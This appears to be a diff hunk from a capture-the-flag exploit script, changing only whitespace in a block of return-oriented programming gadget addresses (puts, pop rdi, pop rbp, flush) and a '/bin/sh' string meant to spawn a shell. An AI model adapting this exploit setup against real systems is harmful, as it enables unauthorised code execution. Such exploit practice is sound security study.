@@ -53,12 +53,12 @@ def read_netbytes(recv_output, outputtype):
 	if outputtype == "bytes":
 		return [i for i in response_list if i != '0xa']
 
-__libc_start_ptr     		 = 0x601020
-puts 				 = 0x40063a # address to puts() function
-pop_rdi				 = 0x4006d3 # pop rdi; ret
-pop_rbp				 = 0x400590 # pop rbp; ret
-stdin  				 = 0x40064e # jump to instruction where stdin is loaded
-flush				 = 0x40063f # flush() function, writes to stdout
+__libc_start_ptr		= 0x601020
+puts				= 0x40063a # address to puts() function
+pop_rdi				= 0x4006d3 # pop rdi; ret
+pop_rbp				= 0x400590 # pop rbp; ret
+stdin				= 0x40064e # jump to instruction where stdin is loaded
+flush				= 0x40063f # flush() function, writes to stdout
 turtleshell = build_bytes("/bin/sh\x00")
 banner = "ROP me outside, how 'about dah?\n"
 
